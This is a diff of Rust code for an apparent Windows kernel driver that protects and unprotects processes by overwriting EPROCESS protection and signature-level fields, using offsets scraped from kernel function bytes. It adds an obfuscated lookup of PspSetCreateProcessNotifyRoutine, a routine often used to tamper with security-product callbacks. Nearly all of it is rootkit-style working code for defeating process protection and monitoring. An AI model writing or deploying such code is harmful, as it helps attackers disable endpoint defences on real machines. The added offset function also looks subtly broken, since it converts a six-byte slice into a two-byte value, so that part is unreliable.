@@ -1,57 +1,18 @@
 use core::ptr::null_mut;
 use common::TargetProcess;
-use kernel_print::kernel_println;
 use winapi::km::wdm::{IRP, PEPROCESS, IO_STACK_LOCATION};
-use winapi::shared::ntdef::{NTSTATUS, NT_SUCCESS, PVOID, HANDLE, UNICODE_STRING};
+use winapi::shared::ntdef::{NTSTATUS, NT_SUCCESS, PVOID, UNICODE_STRING};
 use winapi::shared::ntstatus::{STATUS_SUCCESS, STATUS_UNSUCCESSFUL};
-use winapi::um::winnt::PACCESS_TOKEN;
-
+use crate::includes::{PsLookupProcessByProcessId, ProcessProtectionInformation, ObfDereferenceObject, MmGetSystemRoutineAddress};
 use crate::string::create_unicode_string;
 
-extern "system" {
-    #[allow(dead_code)]
-    pub fn MmIsAddressValid(virtual_address: PVOID) -> bool;
-
-    pub fn PsLookupProcessByProcessId(process_id: HANDLE, process: *mut PEPROCESS) -> NTSTATUS;
-
-    pub fn PsReferencePrimaryToken(process: PEPROCESS) -> PACCESS_TOKEN;
-
-    pub fn PsDereferencePrimaryToken(PrimaryToken: PACCESS_TOKEN);
-
-    pub fn ObfDereferenceObject(object: PVOID);
-
-    pub fn MmGetSystemRoutineAddress(SystemRoutineName: *mut UNICODE_STRING) -> PVOID;
-
-}
-
-#[repr(C)]
-#[derive(Debug, Clone, Copy)]
-pub struct PSProtection {
-    pub protection_type: u8,
-    pub protection_audit: u8,
-    pub protection_signer: u8,
-}
-
-impl Default for PSProtection {
-    fn default() -> Self {
-        Self { protection_type: 3, protection_audit: 1, protection_signer: 4 }
-    }
-}
-
-#[repr(C)]
-#[derive(Debug, Clone, Copy)]
-pub struct ProcessProtectionInformation {
-    pub signature_level: u8,
-	pub section_signature_level: u8,
-	pub protection: PSProtection,
-}
 
 pub fn protect_process(_irp: &mut IRP, stack: *mut IO_STACK_LOCATION) -> NTSTATUS {
     //let target_process = unsafe { (*irp.AssociatedIrp.SystemBuffer()) as *mut TargetProcess };
     let target_process = unsafe { (*stack).Parameters.DeviceIoControl().Type3InputBuffer as *mut TargetProcess };
     
     let mut e_process: PEPROCESS = null_mut();
-    unsafe { kernel_println!("[*] Process ID {:?}", (*target_process).process_id) };
+    unsafe { log::info!("Process ID {:?}", (*target_process).process_id) };
 
     let status = unsafe { PsLookupProcessByProcessId((*target_process).process_id as *mut _, &mut e_process) };
 
@@ -85,7 +46,7 @@ pub fn unprotect_process(_irp: &mut IRP, stack: *mut IO_STACK_LOCATION) -> NTSTA
     let target_process = unsafe { (*stack).Parameters.DeviceIoControl().Type3InputBuffer as *mut TargetProcess };
     
     let mut e_process: PEPROCESS = null_mut();
-    unsafe { kernel_println!("[*] Process ID {:?}", (*target_process).process_id) };
+    unsafe { log::info!("Process ID {:?}", (*target_process).process_id) };
 
     let status = unsafe { PsLookupProcessByProcessId((*target_process).process_id as *mut _, &mut e_process) };
 
@@ -133,11 +94,11 @@ pub fn get_eprocess_protection_offset() -> isize {
     let base_address = get_function_base_address(unicode_function_name);
     let function_bytes: &[u8] = unsafe { core::slice::from_raw_parts(base_address as *const u8, 5) };
 
-    //kernel_println!("Function Bytes in Decimal: {:?}", function_bytes);
+    //log::info!("Function Bytes in Decimal: {:?}", function_bytes);
 
     let slice = &function_bytes[2..4];
     let protection_offset = u16::from_le_bytes(slice.try_into().unwrap());
-    kernel_println!("[*] EPROCESS.PROTECTION OFFSET: {:#x}", protection_offset);
+    log::info!("EPROCESS.Protection: {:#x}", protection_offset);
 
     return protection_offset as isize;
 }
@@ -150,13 +111,36 @@ pub fn get_eprocess_signature_level_offset() -> isize {
     let base_address = get_function_base_address(unicode_function_name);
     let function_bytes: &[u8] = unsafe { core::slice::from_raw_parts(base_address as *const u8, 20) };
 
-    //kernel_println!("Function Bytes in Decimal: {:?}", function_bytes);
+    //log::info!("Function Bytes in Decimal: {:?}", function_bytes);
 
     let slice = &function_bytes[15..17];
     let signature_level_offset = u16::from_le_bytes(slice.try_into().unwrap());
-    kernel_println!("[*] EPROCESS.SIGNATURE_LEVEL OFFSET: {:#x}", signature_level_offset);
+    log::info!("EPROCESS.SignatureLevel: {:#x}", signature_level_offset);
 
     return signature_level_offset as isize;
+}
+
+pub fn find_psp_set_create_process_notify() -> isize {
+    let unicode_function_name = &mut create_unicode_string(
+        obfstr::wide!("PsSetCreateProcessNotifyRoutine\0")
+    ) as *mut UNICODE_STRING;
+    
+    let base_address = get_function_base_address(unicode_function_name);
+
+    if base_address.is_null() {
+        log::error!("PsSetCreateProcessNotifyRoutine is null");
+        return 0;
+    }
+
+    let function_bytes: &[u8] = unsafe { core::slice::from_raw_parts(base_address as *const u8, 18) };
+
+    log::info!("Function Bytes in Decimal: {:?}", function_bytes);
+
+    let slice = &function_bytes[12..18];
+    let psp_offset = u16::from_le_bytes(slice.try_into().unwrap());
+    log::info!("PspSetCreateProcessNotifyRoutine: {:#x}", psp_offset);
+
+    return psp_offset as isize;
 }
 
 /*
